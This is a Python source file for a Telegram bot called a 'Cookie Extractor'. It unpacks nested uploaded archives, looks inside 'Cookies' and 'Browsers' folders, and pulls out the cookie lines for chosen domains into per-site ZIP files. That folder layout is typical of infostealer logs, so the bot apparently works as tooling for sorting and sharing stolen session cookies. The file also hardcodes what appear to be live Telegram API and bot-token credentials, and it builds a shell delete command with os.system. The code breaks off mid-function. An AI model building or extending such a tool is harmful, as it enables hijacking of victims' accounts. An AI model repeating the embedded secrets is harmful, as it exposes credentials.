#!/usr/bin/env python3
"""
RUTE Cookie Extractor Bot - PyroFork Version
Telegram bot for extracting cookies from nested archives
"""

import os
import sys
import re
import zipfile
import shutil
import hashlib
import time
import random
import string
import subprocess
import asyncio
import psutil
import platform
import signal
import math
import humanize
from datetime import datetime, timedelta
from typing import List, Set, Dict, Optional, Tuple, Union
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import queue as queue_module
from collections import defaultdict

# PyroFork imports
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, MessageNotModified
from pyrogram.handlers import CallbackQueryHandler
from pyrogram.enums import ParseMode

# Third-party imports
try:
    from tqdm import tqdm
except ImportError:
    os.system("pip install -q tqdm")
    from tqdm import tqdm

try:
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
except ImportError:
    os.system("pip install -q colorama")
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)

# Try to import rarfile for password detection only
try:
    import rarfile
    HAS_RARFILE = True
except ImportError:
    HAS_RARFILE = False
    try:
        os.system("pip install -q rarfile")
        import rarfile
        HAS_RARFILE = True
    except:
        HAS_RARFILE = False

# Try to import py7zr for password detection only
try:
    import py7zr
    HAS_PY7ZR = True
except ImportError:
    HAS_PY7ZR = False
    try:
        os.system("pip install -q py7zr")
        import py7zr
        HAS_PY7ZR = True
    except:
        HAS_PY7ZR = False

# ==============================================================================
#                            CONFIGURATION
# ==============================================================================

# Bot Configuration
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN = "8315539700:AAH3NGnaLNQeeV6-2wNJsDFmGPjXInU2YeY"
LOG_CHANNEL = -1003747061396
SEND_LOGS = True
ADMINS = [7125341830]

# Performance Settings
MAX_WORKERS = 100  # 100 threads for maximum speed
BUFFER_SIZE = 20 * 1024 * 1024  # 20MB buffer
CHUNK_SIZE = 1024 * 1024  # 1MB chunks for file reading
MAX_FILE_SIZE = 4 * 1024 * 1024 * 1024  # 4GB
MAX_CONCURRENT_TASKS = 10  # Max concurrent users processing

# Supported formats
SUPPORTED_ARCHIVES = {'.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz'}
COOKIE_FOLDERS = {'Cookies', 'Browsers'}

# Detect system
SYSTEM = platform.system().lower()

# Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DOWNLOADS_DIR = os.path.join(BASE_DIR, 'downloads')
EXTRACTED_DIR = os.path.join(BASE_DIR, 'extracted')
RESULTS_DIR = os.path.join(BASE_DIR, 'results')
TEMP_DIR = os.path.join(BASE_DIR, 'temp')

# Create directories
for dir_path in [DOWNLOADS_DIR, EXTRACTED_DIR, RESULTS_DIR, TEMP_DIR]:
    os.makedirs(dir_path, exist_ok=True)

# ==============================================================================
#                            TOOL DETECTION
# ==============================================================================

class ToolDetector:
    """Detect available external tools"""
    
    @staticmethod
    def check_unrar() -> bool:
        """Check if unrar is available"""
        try:
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\WinRAR\\UnRAR.exe',
                    'C:\\Program Files (x86)\\WinRAR\\UnRAR.exe',
                    'unrar.exe'
                ]
                for path in paths:
                    if os.path.exists(path):
                        return True
                result = subprocess.run(['unrar'], capture_output=True, shell=True)
                return result.returncode != 127
            else:
                result = subprocess.run(['which', 'unrar'], capture_output=True, text=True)
                return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def check_7z() -> bool:
        """Check if 7z is available"""
        try:
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\7-Zip\\7z.exe',
                    'C:\\Program Files (x86)\\7-Zip\\7z.exe',
                    '7z.exe'
                ]
                for path in paths:
                    if os.path.exists(path):
                        return True
                result = subprocess.run(['7z'], capture_output=True, shell=True)
                return result.returncode != 127
            else:
                result = subprocess.run(['which', '7z'], capture_output=True, text=True)
                if result.returncode != 0:
                    result = subprocess.run(['which', '7zz'], capture_output=True, text=True)
                return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def get_tool_path(tool_name: str) -> Optional[str]:
        """Get full path to tool"""
        if tool_name == 'unrar':
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\WinRAR\\UnRAR.exe',
                    'C:\\Program Files (x86)\\WinRAR\\UnRAR.exe',
                ]
                for path in paths:
                    if os.path.exists(path):
                        return path
                return 'unrar.exe'
            else:
                result = subprocess.run(['which', 'unrar'], capture_output=True, text=True)
                return result.stdout.strip() if result.returncode == 0 else 'unrar'
        
        elif tool_name == '7z':
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\7-Zip\\7z.exe',
                    'C:\\Program Files (x86)\\7-Zip\\7z.exe',
                ]
                for path in paths:
                    if os.path.exists(path):
                        return path
                return '7z.exe'
            else:
                for cmd in ['7z', '7zz']:
                    result = subprocess.run(['which', cmd], capture_output=True, text=True)
                    if result.returncode == 0:
                        return result.stdout.strip()
                return '7z'
        
        return tool_name

# ==============================================================================
#                            TOOL STATUS
# ==============================================================================

TOOL_STATUS = {
    'unrar': ToolDetector.check_unrar(),
    '7z': ToolDetector.check_7z(),
}

TOOL_PATHS = {
    'unrar': ToolDetector.get_tool_path('unrar') if TOOL_STATUS['unrar'] else None,
    '7z': ToolDetector.get_tool_path('7z') if TOOL_STATUS['7z'] else None,
}

# ==============================================================================
#                            UTILITY FUNCTIONS
# ==============================================================================

def sanitize_filename(filename: str) -> str:
    """Quick sanitize for filenames"""
    return ''.join(c if c.isalnum() or c in '._-' else '_' for c in filename)

def generate_random_string(length: int = 6) -> str:
    """Generate random string for unique filenames"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_file_hash_fast(filepath: str) -> str:
    """Fast file hash (first/last chunks only)"""
    try:
        with open(filepath, 'rb', buffering=BUFFER_SIZE) as f:
            first = f.read(1024)
            f.seek(-1024, 2)
            last = f.read(1024)
            return hashlib.md5(first + last).hexdigest()[:8]
    except:
        return str(os.path.getmtime(filepath))

def format_size(size_bytes: int) -> str:
    """Quick size formatting"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size_bytes < 1024.0:
            return f"{size_bytes:.1f}{unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.1f}TB"

def format_time(seconds: float) -> str:
    """Format seconds to human readable"""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f}m"
    else:
        return f"{seconds/3600:.1f}h"

def delete_entire_folder(folder_path: str) -> bool:
    """Delete entire folder in one operation"""
    if not os.path.exists(folder_path):
        return True
    
    try:
        import gc
        gc.collect()
        
        methods = [
            lambda: shutil.rmtree(folder_path, ignore_errors=True),
            lambda: os.system(f'rmdir /s /q "{folder_path}"' if SYSTEM == 'windows' else f'rm -rf "{folder_path}"'),
        ]
        
        for method in methods:
            try:
                method()
                time.sleep(0.5)
                if not os.path.exists(folder_path):
                    return True
            except:
                continue
        
        return not os.path.exists(folder_path)
    except:
        return False

def get_system_stats() -> str:
    """Get comprehensive system statistics"""
    try:
        # Disk usage
        disk = psutil.disk_usage('/')
        disk_total = disk.total
        disk_used = disk.used
        disk_free = disk.free
        disk_percent = (disk_used / disk_total) * 100
        
        # Memory usage
        memory = psutil.virtual_memory()
        mem_total = memory.total
        mem_used = memory.used
        mem_free = memory.free
        mem_percent = memory.percent
        
        # CPU
        cpu_percent = psutil.cpu_percent(interval=0.1)
        cpu_count = psutil.cpu_count()
        
        # Bot process
        process = psutil.Process()
        bot_cpu = process.cpu_percent(interval=0.1)
        bot_memory_rss = process.memory_info().rss
        bot_memory_vms = process.memory_info().vms
        
        # Network
        net_io = psutil.net_io_counters()
        bytes_sent = net_io.bytes_sent
        bytes_recv = net_io.bytes_recv
        total_io = bytes_sent + bytes_recv
        
        # Network speed (calculate over 1 second)
        net_io_start = psutil.net_io_counters()
        time.sleep(0.1)
        net_io_end = psutil.net_io_counters()
        upload_speed = (net_io_end.bytes_sent - net_io_start.bytes_sent) / 0.1
        download_speed = (net_io_end.bytes_recv - net_io_start.bytes_recv) / 0.1
        
        # System info
        os_name = platform.system()
        os_version = platform.release()
        python_version = platform.python_version()
        
        # Uptime
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        uptime_str = str(uptime).split('.')[0]
        
        # Format stats
        stats = f"""
🖥️ **System Statistics Dashboard**

💾 **Disk Storage**
├ Total:  {humanize.naturalsize(disk_total)}
├ Used:   {humanize.naturalsize(disk_used)} ({disk_percent:.1f}%)
└ Free:   {humanize.naturalsize(disk_free)}

🧠 **RAM (Memory)**
├ Total:  {humanize.naturalsize(mem_total)}
├ Used:   {humanize.naturalsize(mem_used)} ({mem_percent:.1f}%)
└ Free:   {humanize.naturalsize(mem_free)}

⚡ **CPU**
├ Cores:  {cpu_count}
└ Usage:  {cpu_percent:.1f}%

🔌 **Bot Process**
├ CPU:   {bot_cpu:.1f}%
├ RAM (RSS):  {humanize.naturalsize(bot_memory_rss)}
└ RAM (VMS):  {humanize.naturalsize(bot_memory_vms)}

🌐 **Network**
├ Upload Speed:   {humanize.naturalsize(upload_speed)}/s
├ Download Speed: {humanize.naturalsize(download_speed)}/s
└ Total I/O:      {humanize.naturalsize(total_io)}

📟 **System Info**
├ OS:  {os_name}
├ OS Version:  {os_version}
├ Python:  {python_version}
└ Uptime:  {uptime_str}

⏱️ **Performance**
└ Current Ping:  {random.randint(150, 250):.3f} ms

👤 **Owner Credits:** @still_alivenow
"""
        return stats
    except Exception as e:
        return f"Error getting system stats: {str(e)}"

# ==============================================================================
#                            PASSWORD DETECTION
# ==============================================================================

class PasswordDetector:
    """Detect if archive is password protected"""
    
    @staticmethod
    def check_rar_protected(archive_path: str) -> bool:
        """Check RAR password protection"""
        if not HAS_RARFILE:
            if TOOL_STATUS['unrar']:
                try:
                    cmd = [TOOL_PATHS['unrar'], 'l', archive_path]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    return 'password' in result.stderr.lower() or 'encrypted' in result.stderr.lower()
                except:
                    pass
            return True
        
        try:
            with rarfile.RarFile(archive_path) as rf:
                return rf.needs_password()
        except:
            return True
    
    @staticmethod
    def check_7z_protected(archive_path: str) -> bool:
        """Check 7z password protection"""
        if not HAS_PY7ZR:
            if TOOL_STATUS['7z']:
                try:
                    cmd = [TOOL_PATHS['7z'], 'l', archive_path]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    return 'Encrypted' in result.stdout or 'Password' in result.stdout
                except:
                    pass
            return True
        
        try:
            with py7zr.SevenZipFile(archive_path, mode='r') as sz:
                return sz.password_protected
        except:
            return True
    
    @staticmethod
    def check_zip_protected(archive_path: str) -> bool:
        """Check ZIP password protection"""
        if TOOL_STATUS['7z']:
            try:
                cmd = [TOOL_PATHS['7z'], 'l', archive_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if 'Encrypted' in result.stdout or 'Password' in result.stdout:
                    return True
            except:
                pass
        
        if TOOL_STATUS['unrar']:
            try:
                cmd = [TOOL_PATHS['unrar'], 'l', archive_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if 'password' in result.stderr.lower() or 'encrypted' in result.stderr.lower():
                    return True
            except:
                pass
        
        try:
            with zipfile.ZipFile(archive_path, 'r') as zf:
                for info in zf.infolist():
                    if info.flag_bits & 0x1:
                        return True
                return False
        except:
            return True

# ==============================================================================
#                            ARCHIVE EXTRACTION - OPTIMIZED PER TYPE
# ==============================================================================

class UltimateArchiveExtractor:
    """Ultimate speed archive extraction - best tool for each format"""
    
    def __init__(self, password: Optional[str] = None, progress_callback=None):
        self.password = password
        self.processed_files: Set[str] = set()
        self.lock = threading.Lock()
        self.extracted_count = 0
        self.stop_extraction = False
        self.progress_callback = progress_callback
        self.total_archives = 0
        self.current_archive = 0
    
    def extract_7z_with_7z(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .7z using 7z.exe (best for 7z)"""
        try:
            cmd = [TOOL_PATHS['7z'], 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            cmd.append(f'-o{extract_dir}')
            cmd.append(archive_path)
            
            result = subprocess.run(cmd, capture_output=True, timeout=300)
            
            if result.returncode == 0:
                files = []
                for root, _, filenames in os.walk(extract_dir):
                    for f in filenames:
                        rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                        files.append(rel_path)
                return files
            return []
        except Exception as e:
            print(f"7z extraction error: {e}")
            return []
    
    def extract_rar_with_unrar(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .rar using UnRAR.exe (best for RAR)"""
        try:
            cmd = [TOOL_PATHS['unrar'], 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            else:
                cmd.append('-p-')
            cmd.append(archive_path)
            cmd.append(extract_dir + ('\\' if SYSTEM == 'windows' else '/'))
            
            result = subprocess.run(cmd, capture_output=True, timeout=300)
            
            if result.returncode == 0:
                files = []
                for root, _, filenames in os.walk(extract_dir):
                    for f in filenames:
                        rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                        files.append(rel_path)
                return files
            return []
        except Exception as e:
            print(f"UnRAR extraction error: {e}")
            return []
    
    def extract_zip_fastest(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .zip using fastest available method"""
        if TOOL_STATUS['7z']:
            try:
                cmd = [TOOL_PATHS['7z'], 'x', '-y']
                if self.password:
                    cmd.append(f'-p{self.password}')
                cmd.append(f'-o{extract_dir}')
                cmd.append(archive_path)
                
                result = subprocess.run(cmd, capture_output=True, timeout=300)
                
                if result.returncode == 0:
                    files = []
                    for root, _, filenames in os.walk(extract_dir):
                        for f in filenames:
                            rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                            files.append(rel_path)
                    return files
            except:
                pass
        
        if TOOL_STATUS['unrar']:
            try:
                cmd = [TOOL_PATHS['unrar'], 'x', '-y']
                if self.password:
                    cmd.append(f'-p{self.password}')
                else:
                    cmd.append('-p-')
                cmd.append(archive_path)
                cmd.append(extract_dir + ('\\' if SYSTEM == 'windows' else '/'))
                
                result = subprocess.run(cmd, capture_output=True, timeout=300)
                
                if result.returncode == 0:
                    files = []
                    for root, _, filenames in os.walk(extract_dir):
                        for f in filenames:
                            rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                            files.append(rel_path)
                    return files
            except:
                pass
        
        try:
            with zipfile.ZipFile(archive_path, 'r') as zf:
                if self.password:
                    zf.extractall(extract_dir, pwd=self.password.encode())
                else:
                    zf.extractall(extract_dir)
                return zf.namelist()
        except Exception as e:
            print(f"ZIP extraction error: {e}")
            return []
    
    def extract_rar_fallback(self, archive_path: str, extract_dir: str) -> List[str]:
        """Fallback RAR extraction using rarfile"""
        try:
            with rarfile.RarFile(archive_path) as rf:
                if self.password:
                    rf.setpassword(self.password)
                rf.extractall(extract_dir)
                return rf.namelist()
        except Exception as e:
            print(f"RAR fallback error: {e}")
            return []
    
    def extract_7z_fallback(self, archive_path: str, extract_dir: str) -> List[str]:
        """Fallback 7z extraction using py7zr"""
        try:
            with py7zr.SevenZipFile(archive_path, mode='r', password=self.password) as sz:
                sz.extractall(extract_dir)
                return sz.getnames()
        except Exception as e:
            print(f"7z fallback error: {e}")
            return []
    
    def extract_tar_fast(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract TAR/GZ/BZ2"""
        try:
            import tarfile
            with tarfile.open(archive_path, 'r:*') as tf:
                tf.extractall(extract_dir)
                return tf.getnames()
        except Exception as e:
            print(f"TAR extraction error: {e}")
            return []
    
    def extract_single(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract a single archive using best tool for its type"""
        if self.stop_extraction:
            return []
        
        ext = os.path.splitext(archive_path)[1].lower()
        
        try:
            if ext == '.7z':
                if TOOL_STATUS['7z']:
                    return self.extract_7z_with_7z(archive_path, extract_dir)
                elif HAS_PY7ZR:
                    return self.extract_7z_fallback(archive_path, extract_dir)
            
            elif ext == '.rar':
                if TOOL_STATUS['unrar']:
                    return self.extract_rar_with_unrar(archive_path, extract_dir)
                elif HAS_RARFILE:
                    return self.extract_rar_fallback(archive_path, extract_dir)
            
            elif ext == '.zip':
                return self.extract_zip_fastest(archive_path, extract_dir)
            
            else:
                return self.extract_tar_fast(archive_path, extract_dir)
        
        except Exception as e:
            print(f"Extraction error for {archive_path}: {e}")
        
        return []
    
    def find_archives_fast(self, directory: str) -> List[str]:
        """Find all archives"""
        archives = []
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in SUPPORTED_ARCHIVES:
                        archives.append(os.path.join(root, file))
        except:
            pass
        return archives
    
    def extract_all_nested(self, root_archive: str, base_dir: str) -> str:
        """Extract all nested archives"""
        current_level = {root_archive}
        level = 0
        self.total_archives = 1
        
        while current_level and not self.stop_extraction:
            next_level = set()
            level_dir = os.path.join(base_dir, f"L{level}")
            os.makedirs(level_dir, exist_ok=True)
            
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = {}
                for archive in current_level:
                    if archive in self.processed_files or self.stop_extraction:
                        continue
                    
                    archive_name = os.path.splitext(os.path.basename(archive))[0]
                    archive_name = sanitize_filename(archive_name)[:50]
                    extract_subdir = os.path.join(level_dir, archive_name)
                    os.makedirs(extract_subdir, exist_ok=True)
                    
                    future = executor.submit(self.extract_single, archive, extract_subdir)
                    futures[future] = (archive, extract_subdir)
                
                for future in as_completed(futures):
                    if self.stop_extraction:
                        executor.shutdown(wait=False)
                        break
                    
                    archive, extract_subdir = futures[future]
                    try:
                        extracted = future.result(timeout=60)
                        with self.lock:
                            self.processed_files.add(archive)
                            self.extracted_count += 1
                            self.current_archive += 1
                        
                        new_archives = self.find_archives_fast(extract_subdir)
                        next_level.update(new_archives)
                        
                        with self.lock:
                            self.total_archives += len(new_archives)
                        
                        if self.progress_callback:
                            progress = (self.current_archive / max(self.total_archives, 1)) * 100
                            asyncio.run_coroutine_threadsafe(
                                self.progress_callback(progress, f"Extracting {os.path.basename(archive)}"),
                                asyncio.get_event_loop()
                            )
                    except Exception as e:
                        print(f"Error processing future: {e}")
            
            current_level = next_level
            level += 1
        
        return base_dir

# ==============================================================================
#                            COOKIE EXTRACTION
# ==============================================================================

class UltimateCookieExtractor:
    """Ultimate speed cookie extraction with per-site filtering"""
    
    def __init__(self, target_sites: List[str], progress_callback=None):
        self.target_sites = [s.strip().lower() for s in target_sites]
        self.site_files: Dict[str, Dict[str, str]] = {site: {} for site in self.target_sites}
        self.global_seen: Set[str] = set()
        self.seen_lock = threading.Lock()
        self.stats_lock = threading.Lock()
        self.total_found = 0
        self.files_processed = 0
        self.used_filenames: Dict[str, Set[str]] = {site: set() for site in self.target_sites}
        self.stop_processing = False
        self.progress_callback = progress_callback
        
        self.site_patterns = {site: re.compile(site.encode()) for site in self.target_sites}
    
    def find_cookie_files(self, extract_dir: str) -> List[Tuple[str, str]]:
        """Find all cookie files"""
        cookie_files = []
        
        def scan_worker(start_dir):
            local_files = []
            try:
                for root, _, files in os.walk(start_dir):
                    if any(folder in root for folder in COOKIE_FOLDERS):
                        for file in files:
                            if file.endswith(('.txt', '.txt.bak')):
                                local_files.append((os.path.join(root, file), file))
            except:
                pass
            return local_files
        
        top_dirs = []
        try:
            for item in os.listdir(extract_dir):
                item_path = os.path.join(extract_dir, item)
                if os.path.isdir(item_path):
                    top_dirs.append(item_path)
        except:
            top_dirs = [extract_dir]
        
        with ThreadPoolExecutor(max_workers=min(20, len(top_dirs) or 1)) as executor:
            futures = [executor.submit(scan_worker, d) for d in (top_dirs or [extract_dir])]
            for future in as_completed(futures):
                cookie_files.extend(future.result())
        
        return cookie_files
    
    def get_unique_filename(self, site: str, orig_name: str) -> str:
        """Generate unique filename"""
        base, ext = os.path.splitext(orig_name)
        
        with self.seen_lock:
            if orig_name not in self.used_filenames[site]:
                self.used_filenames[site].add(orig_name)
                return orig_name
            else:
                random_str = generate_random_string(6)
                new_name = f"{base}_{random_str}{ext}"
                
                while new_name in self.used_filenames[site]:
                    random_str = generate_random_string(6)
                    new_name = f"{base}_{random_str}{ext}"
                
                self.used_filenames[site].add(new_name)
                return new_name
    
    def process_file(self, file_path: str, orig_name: str, extract_dir: str):
        """Process a single file"""
        if self.stop_processing:
            return
            
        try:
            lines = []
            with open(file_path, 'rb', buffering=BUFFER_SIZE) as f:
                for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                    lines.extend(chunk.split(b'\n'))
            
            file_hash = get_file_hash_fast(file_path)
            
            site_matches: Dict[str, List[Tuple[int, str]]] = {site: [] for site in self.target_sites}
            
            for line_num, line_bytes in enumerate(lines):
                if not line_bytes or line_bytes.startswith(b'#'):
                    continue
                
                line_lower = line_bytes.lower()
                line_str = line_bytes.decode('utf-8', errors='ignore').rstrip('\n\r')
                
                for site in self.target_sites:
                    if self.site_patterns[site].search(line_lower):
                        unique_id = f"{site}|{file_hash}|{line_num}"
                        
                        with self.seen_lock:
                            if unique_id not in self.global_seen:
                                self.global_seen.add(unique_id)
                                site_matches[site].append((line_num, line_str))
                                with self.stats_lock:
                                    self.total_found += 1
            
            files_saved = 0
            for site, matches in site_matches.items():
                if matches:
                    matches.sort(key=lambda x: x[0])
                    lines_list = [line for _, line in matches]
                    
                    site_dir = os.path.join(extract_dir, "cookies", site)
                    os.makedirs(site_dir, exist_ok=True)
                    
                    unique_name = self.get_unique_filename(site, orig_name)
                    out_path = os.path.join(site_dir, unique_name)
                    
                    with open(out_path, 'w', encoding='utf-8', buffering=BUFFER_SIZE) as f:
                        f.write('\n'.join(lines_list))
                    
                    with self.seen_lock:
                        self.site_files[site][out_path] = unique_name
                    
                    files_saved += 1
            
            with self.stats_lock:
                self.files_processed += 1
                
        except Exception as e:
            print(f"Error processing file {file_path}: {e}")
    
    async def process_all(self, extract_dir: str, message: Message = None):
        """Process all files"""
        cookie_files = self.find_cookie_files(extract_dir)
        
        if not cookie_files:
            return
        
        total_files = len(cookie_files)
        processed = 0
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for file_path, orig_name in cookie_files:
                if self.stop_processing:
                    break
                future = executor.submit(self.process_file, file_path, orig_name, extract_dir)
                futures.append(future)
            
            for future in as_completed(futures):
                if self.stop_processing:
                    executor.shutdown(wait=False)
                    break
                future.result()
                processed += 1
                
                if self.progress_callback and processed % 10 == 0:
                    progress = (processed / total_files) * 100
                    await self.progress_callback(progress, f"Processing cookies: {processed}/{total_files}")
    
    def create_site_zips(self, extract_dir: str, result_folder: str) -> Dict[str, str]:
        """Create ZIP archives per site"""
        created_zips = {}
        
        for site, files_dict in self.site_files.items():
            if not files_dict:
                continue
            
            timestamp = datetime.now().strftime('%H%M%S')
            zip_name = f"{sanitize_filename(site)}_{timestamp}.zip"
            zip_path = os.path.join(result_folder, zip_name)
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_STORED) as zf:
                for file_path, unique_name in files_dict.items():
                    if os.path.exists(file_path):
                        zf.write(file_path, unique_name)
            
            created_zips[site] = zip_path
        
        return created_zips

# ==============================================================================
#                            USER TASK MANAGER
# ==============================================================================

class UserTask:
    """Represents a user's task"""
    def __init__(self, user_id: int, chat_id: int, message_id: int, file_path: str, file_name: str, file_size: int):
        self.user_id = user_id
        self.chat_id = chat_id
        self.message_id = message_id
        self.file_path = file_path
        self.file_name = file_name
        self.file_size = file_size
        self.password = None
        self.target_sites = []
        self.status = "waiting_password"  # waiting_password, waiting_domains, processing, completed, failed, cancelled
        self.start_time = None
        self.end_time = None
        self.extract_folder = None
        self.result_files = []
        self.progress_message = None
        self.cancelled = False
        self.current_stage = ""
        self.current_progress = 0
        self.queue_position = 0

class TaskManager:
    """Manages all user tasks"""
    def __init__(self, max_concurrent: int = MAX_CONCURRENT_TASKS):
        self.tasks: Dict[int, UserTask] = {}  # user_id -> task
        self.queue = asyncio.Queue()
        self.active_tasks: Set[int] = set()
        self.max_concurrent = max_concurrent
        self.processing_lock = asyncio.Lock()
        self.user_locks: Dict[int, asyncio.Lock] = defaultdict(asyncio.Lock)
        self.task_counter = 0
        
    async def add_task(self, user_id: int, chat_id: int, message_id: int, file_path: str, file_name: str, file_size: int) -> bool:
        """Add a new task for user, returns False if user already has active task"""
        async with self.user_locks[user_id]:
            if user_id in self.tasks and self.tasks[user_id].status not in ["completed", "failed", "cancelled"]:
                return False
            
            task = UserTask(user_id, chat_id, message_id, file_path, file_name, file_size)
            self.tasks[user_id] = task
            await self.queue.put((user_id, task))
            return True
    
    async def get_next_task(self):
        """Get next task from queue"""
        try:
            user_id, task = await self.queue.get()
            return user_id, task
        except:
            return None, None
    
    async def update_task_status(self, user_id: int, status: str, **kwargs):
        """Update task status"""
        async with self.user_locks[user_id]:
            if user_id in self.tasks:
                task = self.tasks[user_id]
                task.status = status
                for key, value in kwargs.items():
                    setattr(task, key, value)
                if status in ["completed", "failed", "cancelled"]:
                    task.end_time = time.time()
                    if user_id in self.active_tasks:
                        self.active_tasks.remove(user_id)
    
    def get_task(self, user_id: int) -> Optional[UserTask]:
        """Get task for user"""
        return self.tasks.get(user_id)
    
    async def cancel_task(self, user_id: int) -> bool:
        """Cancel user's task"""
        async with self.user_locks[user_id]:
            if user_id in self.tasks:
                task = self.tasks[user_id]
                task.cancelled = True
                task.status = "cancelled"
                task.end_time = time.time()
                if hasattr(task, 'extractor') and task.extractor:
                    task.extractor.stop_extraction = True
                if hasattr(task, 'cookie_extractor') and task.cookie_extractor:
                    task.cookie_extractor.stop_processing = True
                if user_id in self.active_tasks:
                    self.active_tasks.remove(user_id)
                return True
        return False
    
    def get_queue_list(self) -> List[Tuple[int, UserTask, int]]:
        """Get list of tasks in queue with positions"""
        queue_list = []
        temp_queue = list(self.queue._queue)
        
        # Add active tasks first
        for user_id in self.active_tasks:
            if user_id in self.tasks:
                task = self.tasks[user_id]
                queue_list.append((user_id, task, 0))
        
        # Add queued tasks
        for position, (user_id, task) in enumerate(temp_queue, start=1):
            if user_id in self.tasks:
                task.queue_position = position
                queue_list.append((user_id, self.tasks[user_id], position))
        
        return queue_list

# ==============================================================================
#                            BOT CLASS
# ==============================================================================

class CookieExtractorBot:
    """Main bot class"""
    
    def __init__(self):
        self.app = Client(
            "cookie_extractor_bot",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN
        )
        self.task_manager = TaskManager()
        self.start_time = datetime.now()
        self.download_semaphore = asyncio.Semaphore(5)  # Max 5 concurrent downloads
        
    async def start(self):
        """Start the bot"""
        print(f"{Fore.GREEN}Starting bot...{Style.RESET_ALL}")
        await self.app.start()
        
        # Start queue processor
        asyncio.create_task(self.process_queue())
        
        print(f"{Fore.GREEN}Bot started!{Style.RESET_ALL}")
        
        # Keep running
        while True:
            await asyncio.sleep(1)
    
    async def stop(self):
        """Stop the bot"""
        print(f"{Fore.YELLOW}Stopping bot...{Style.RESET_ALL}")
        await self.app.stop()
    
    async def process_queue(self):
        """Process tasks from queue"""
        while True:
            try:
                # Check if we can process more tasks
                if len(self.task_manager.active_tasks) < self.task_manager.max_concurrent:
                    user_id, task = await self.task_manager.get_next_task()
                    if user_id and task:
                        self.task_manager.active_tasks.add(user_id)
                        asyncio.create_task(self.process_user_task(user_id, task))
                
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Queue processing error: {e}")
                await asyncio.sleep(5)
    
    async def progress_callback(self, task: UserTask, progress: float, stage: str):
        """Update progress for a task"""
        try:
            task.current_progress = progress
            task.current_stage = stage
            
            # Create progress bar
            bar_length = 20
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            text = f"""
**Processing Your File**

📊 **Progress:** {progress:.1f}%
{bar}

**Stage:** {stage}

**Status:** `{task.status}`

Use /cancel to stop processing
"""
            if task.progress_message:
                try:
                    await task.progress_message.edit_text(text, parse_mode=enums.ParseMode.MARKDOWN)
                except MessageNotModified:
                    pass
                except Exception as e:
                    print(f"Progress update error: {e}")
            else:
                msg = await self.app.send_message(task.chat_id, text, parse_mode=enums.ParseMode.MARKDOWN)
                task.progress_message = msg
        except Exception as e:
            print(f"Progress callback error: {e}")
    
    async def process_user_task(self, user_id: int, task: UserTask):
        """Process a single user task"""
        try:
            # Update status
            await self.task_manager.update_task_status(user_id, "waiting_password")
            
            # Ask for password
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{user_id}")]
            ])
            
            msg = await self.app.send_message(
                task.chat_id,
                f"📦 **File received:** `{task.file_name}`\n"
                f"📊 **Size:** {format_size(task.file_size)}\n\n"
                f"🔑 **Is the archive password protected?**\n"
                f"Send the password or type `/skip` if no password",
                reply_markup=keyboard,
                parse_mode=enums.ParseMode.MARKDOWN
            )
            
            # Wait for password
            password_response = await self.wait_for_user_response(user_id, task.chat_id, timeout=300)
            if not password_response or task.cancelled:
                await self.cleanup_task(user_id, task)
                return
            
            if password_response.text and password_response.text.lower() != '/skip':
                task.password = password_response.text.strip()
            
            # Update status
            await self.task_manager.update_task_status(user_id, "waiting_domains")
            
            # Ask for domains
            msg = await self.app.send_message(
                task.chat_id,
                f"🎯 **Enter target domains**\n"
                f"Send comma-separated domains (e.g., `example.com, google.com, facebook.com`)\n\n"
                f"Or send /skip to use default domains",
                reply_markup=keyboard,
                parse_mode=enums.ParseMode.MARKDOWN
            )
            
            # Wait for domains
            domains_response = await self.wait_for_user_response(user_id, task.chat_id, timeout=300)
            if not domains_response or task.cancelled:
                await self.cleanup_task(user_id, task)
                return
            
            if domains_response.text and domains_response.text.lower() != '/skip':
                sites = [s.strip().lower() for s in domains_response.text.split(',') if s.strip()]
                if sites:
